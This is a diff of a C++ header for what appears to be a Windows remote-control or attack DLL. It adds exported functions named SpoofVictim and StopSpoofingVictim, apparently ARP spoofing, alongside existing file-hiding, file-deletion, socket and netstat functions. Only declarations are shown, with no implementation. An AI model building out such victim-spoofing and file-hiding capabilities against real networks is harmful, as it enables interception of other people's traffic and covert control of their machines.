@@ -11,11 +11,11 @@
 #include <string>
 #include <vector>
 #include <algorithm>
+#include <fstream>
+#include <numeric>
 #include <sstream>
 #include <iterator>
 #include <thread>
-#include <fstream>
-#include <numeric>
 #include "MyFileClass.h"
 using namespace std;
 
@@ -31,12 +31,16 @@ extern "C" {
 	extern __declspec(dllexport) string GetAllFiles(string dir);
 	extern __declspec(dllexport) string OpenSocket(string ip_and_port);
 	extern __declspec(dllexport) string ChangeFile(string file);
+	extern __declspec(dllexport) string SpoofVictim(std::string ip);
+	extern __declspec(dllexport) bool StopSpoofingVictim(std::string ip);
 #else
 	extern __declspec(dllexport) string RunNetstat(string nothing);
 	extern __declspec(dllexport) string GetAllFiles(string dir);
 	extern __declspec(dllexport) string OpenSocket(string ip_and_port);
 	extern __declspec(dllexport) string ChangeFile(string file);
 	extern __declspec(dllexport) string GetArpTable();
+	extern __declspec(dllexport) string SpoofVictim(std::string ip);
+	extern __declspec(dllexport) bool StopSpoofingVictim(std::string ip);
 
 #endif
 }
@@ -53,5 +57,5 @@ string HideFileOrFolder(string file);
 string DeleteGivenFile(string file);
 string UnHideFileOrFolder(string pathtofileorfolder);
 string MoveGivenFileToDestination(string pathtofile, string Destination);
-string SplitArpLine(string line);
+void SpoofVictimInThread(std::string ip);
 #endif
